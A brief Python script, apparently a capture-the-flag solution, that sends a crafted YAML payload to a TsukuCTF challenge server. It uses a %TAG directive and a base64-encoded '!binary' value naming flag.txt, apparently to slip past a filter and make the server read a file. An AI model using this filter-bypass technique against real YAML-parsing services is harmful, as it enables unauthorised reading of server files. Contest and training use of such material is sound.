from requests import post

res = post(
    "http://challs.tsukuctf.org:50001",
    headers={"Content-Type": "text/plain"},
    data="""%TAG !b! tag:yaml.org,2002:
---
file: !b!binary |
  ZmxhZy50eHQ=""",
)
print(res.text)
